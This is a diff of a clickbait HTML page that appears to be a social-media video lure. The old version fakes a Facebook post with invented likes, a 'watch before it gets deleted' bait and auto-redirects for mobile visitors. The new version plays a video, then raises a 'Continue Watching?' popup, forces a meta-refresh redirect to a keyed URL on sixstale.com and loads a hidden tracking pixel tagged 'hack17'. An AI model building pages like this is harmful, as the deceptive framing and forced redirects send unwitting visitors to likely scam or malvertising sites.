@@ -1,299 +1,202 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>LIVE BROADSCAST_WATCH NOW 🎥⏯️2:32―●―――――52:50🍆📽️⏯️</title>
+<title> Best Friends, Big Laughs, Tiny Moments 💖😂 </title>
 
-<meta property="og:title" content="⏯️2:32―●―――――52:50🍆📽️⏯️">
-<meta property="og:description" content="This video is going viral right now 👀">
-<meta property="og:image" content="https://i.imgur.com/Xs20i0Z.jpeg">
-<meta property="og:url" content="https://towerbat.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6">
+<meta property="og:title" content="Best Friends, Big Laughs, Tiny Moments 💖😂">
+<meta property="og:description" content="Watch before it gets deleted 👀">
+<meta property="og:image" content="https://i.imgur.com/y9VdANx.jpeg">
 <meta property="og:type" content="website">
 
 <style>
 
 *{
+box-sizing:border-box;
 margin:0;
 padding:0;
-box-sizing:border-box;
 font-family:Arial,sans-serif;
 }
 
-body{
-background:#f0f2f5;
-overflow-x:hidden;
-}
-
-.bg{
-position:fixed;
+html,body{
 width:100%;
 height:100%;
-background:url('https://i.imgur.com/Xs20i0Z.jpeg') center/cover;
-filter:blur(15px);
-transform:scale(1.1);
-opacity:.3;
-z-index:-1;
-}
-
-.container{
-width:100%;
-max-width:720px;
-margin:auto;
-padding:8px 6px 100px;
-}
-
-.modal{
-background:#fff;
-border-radius:12px;
+background:#000;
 overflow:hidden;
-box-shadow:0 10px 40px rgba(0,0,0,.25);
-margin-bottom:20px;
+color:#fff;
 }
 
-.top{
-padding:15px;
-font-size:26px;
-font-weight:bold;
-text-align:center;
-border-bottom:1px solid #ddd;
-}
-
-.post{
+.main{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
 display:flex;
 align-items:center;
-padding:12px;
-}
-
-.avatar{
-width:42px;
-height:42px;
-border-radius:50%;
-margin-right:10px;
-object-fit:cover;
-}
-
-.name{
-font-weight:bold;
-font-size:15px;
-}
-
-.time{
-font-size:13px;
-color:#777;
-margin-top:2px;
-}
-
-.video{
-position:relative;
+justify-content:center;
 background:#000;
-cursor:pointer;
 }
 
-.video img{
+.video-wrapper{
 width:100%;
-display:block;
+height:100%;
+position:relative;
 }
 
-.overlay-text{
-position:absolute;
-top:15px;
-left:15px;
-right:15px;
-background:rgba(0,0,0,.65);
-color:white;
-padding:12px;
-border-radius:12px;
-font-size:22px;
-font-weight:bold;
-text-align:center;
-backdrop-filter:blur(4px);
-text-shadow:0 2px 8px rgba(0,0,0,.6);
-animation:pulseText 1.5s infinite;
+video{
+width:100vw;
+height:100vh;
+object-fit:contain;
+background:#000;
 }
 
-@keyframes pulseText{
-0%{transform:scale(1);}
-50%{transform:scale(1.03);}
-100%{transform:scale(1);}
-}
-
-.play{
-position:absolute;
-top:50%;
-left:50%;
-transform:translate(-50%,-50%);
-font-size:90px;
-color:white;
-text-shadow:0 0 20px rgba(0,0,0,.5);
-}
-
-.caption{
-padding:14px;
-font-size:20px;
-font-weight:bold;
-}
-
-.stats{
-display:flex;
-justify-content:space-between;
-padding:0 14px 12px;
-font-size:14px;
-color:#666;
-}
-
-.actions{
-display:flex;
-justify-content:space-around;
-padding:12px;
-border-top:1px solid #eee;
-font-weight:bold;
-color:#666;
-}
-
-.gallery{
-padding:12px;
-display:grid;
-grid-template-columns:1fr;
-gap:14px;
-}
-
-.gallery img{
-width:100%;
-border-radius:14px;
-cursor:pointer;
-transition:.2s;
-max-height:650px;
-object-fit:cover;
-}
-
-.gallery img:hover{
-transform:scale(1.02);
-}
-
-.btn{
+.popup-overlay{
 position:fixed;
-bottom:20px;
-left:50%;
-transform:translateX(-50%);
-background:#1877f2;
-color:white;
-padding:15px 30px;
-border-radius:50px;
-text-decoration:none;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.75);
+display:flex;
+align-items:center;
+justify-content:center;
+z-index:9999;
+opacity:0;
+pointer-events:none;
+transition:.25s;
+}
+
+.popup-overlay.active{
+opacity:1;
+pointer-events:auto;
+}
+
+.popup-box{
+background:#111;
+padding:26px;
+border-radius:12px;
+text-align:center;
+max-width:320px;
+width:90%;
+border:1px solid #222;
+box-shadow:0 10px 35px rgba(0,0,0,.4);
+}
+
+.popup-box h3{
+font-size:22px;
+margin-bottom:10px;
+}
+
+.popup-box p{
+font-size:14px;
+color:#bbb;
+margin-bottom:18px;
+line-height:1.5;
+}
+
+.popup-btn{
+background:#fa0909;
+border:none;
+color:#fff;
+padding:14px 20px;
+border-radius:8px;
 font-weight:bold;
-z-index:99;
-box-shadow:0 5px 20px rgba(24,119,242,.5);
+cursor:pointer;
+width:100%;
+font-size:16px;
+text-decoration:none;
+display:inline-block;
 animation:pulse 1.5s infinite;
 }
 
 @keyframes pulse{
-0%{transform:translateX(-50%) scale(1);}
-50%{transform:translateX(-50%) scale(1.05);}
-100%{transform:translateX(-50%) scale(1);}
+0%{transform:scale(1);}
+50%{transform:scale(1.04);}
+100%{transform:scale(1);}
+}
+
+.info{
+position:absolute;
+top:15px;
+left:15px;
+background:rgba(0,0,0,.6);
+padding:8px 14px;
+border-radius:30px;
+font-size:14px;
+backdrop-filter:blur(4px);
 }
 
 </style>
+
 </head>
 
 <body>
 
-<div class="bg"></div>
+<div class="main">
 
-<div class="container">
+<div class="video-wrapper">
 
-<div class="modal">
-
-<div class="top">
-Trending Post
+<div class="info">
+🔥 Trending Video
 </div>
 
-<div class="post">
-<img class="avatar" src="https://i.imgur.com/Xs20i0Z.jpeg">
+<video
+id="video"
+autoplay
+muted
+playsinline
+controls>
 
-<div>
-<div class="name">Emily Carter</div>
-<div class="time">12h · Public</div>
-</div>
-</div>
+<source src="https://cdn.videy.co/IfMLb3zi1.mp4" type="video/mp4">
 
-<div class="video" onclick="goLink()">
-
-<img src="https://i.imgur.com/Xs20i0Z.jpeg">
-
-<div class="overlay-text">
-WATCH BEFORE IT GETS DELETED 😳🔥
-</div>
-
-<div class="play">▶</div>
-
-</div>
-
-<div class="caption">
-Wait until the end 😳🔥
-</div>
-
-<div class="stats">
-<div>👍 8.9K</div>
-<div>1.2K comments</div>
-</div>
-
-<div class="actions">
-<div>👍 Like</div>
-<div>💬 Comment</div>
-<div>↗ Share</div>
-</div>
-
-<div class="gallery">
-<img src="https://i.imgur.com/IydKyBf.jpeg" onclick="goLink()">
-<div class="img-title">THIS VIDEO IS EVERYWHERE 🔥
-👀 CLICK PLAY TO WATCH IT 😵‍💫</div>
-<img src="https://i.imgur.com/aEft4Ws.jpeg" onclick="goLink()">
-<div class="img-title">THIS VIDEO IS GOING VIRAL 😵‍💫🔥</div>
-<img src="https://i.imgur.com/V9kvEsZ.jpeg" onclick="goLink()">
-THIS VIDEO IS EVERYWHERE 🔥
-👀 CLICK PLAY TO WATCH IT 😵‍💫
-<img src="https://i.imgur.com/V9kvEsZ.jpeg" onclick="goLink()">
-</div>
+</video>
 
 </div>
 
 </div>
 
-<a class="btn" href="https://towerbat.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6" target="_blank">
-WATCH NOW FULL VIDEO CLICK HERE😳🔥
+<!-- POPUP -->
+
+<div class="popup-overlay" id="continuePopup">
+
+<div class="popup-box">
+
+<h3>Continue Watching?</h3>
+
+<p>
+Press continue to keep watching the full video 👀
+</p>
+
+<a class="popup-btn" href="https://sixstale.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6">
+▶ Continue
 </a>
+
+</div>
+
+</div>
+
+<!-- CONTADOR -->
+
 
 <script>
 
-function goLink(){
-window.location.href = "https://towerbat.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6";
-}
+const popup = document.getElementById("continuePopup");
 
-if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+/* MOSTRAR POPUP DESPUES DE 7s */
 
-setTimeout(() => {
+setTimeout(function(){
 
-window.location.href = "https://sixstale.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6";
+popup.classList.add("active");
 
-}, 5000);
-
-}
+},7000);
 
 </script>
 
 </body>
 </html>
-<script>
-var pagina = "https://sixstale.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6";
-
-function redireccionar() {
-    location.href = pagina;
-}
-
-setTimeout(redireccionar, 100);
-</script>
-
+<meta http-equiv="REFRESH" content="05;URL=https://sixstale.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6"
 <img src="//whos.amung.us/pingjs/?k=hack17&t=Duko𓆰𓆪💯&x=https://www.facebook.com" style="display:none">
-
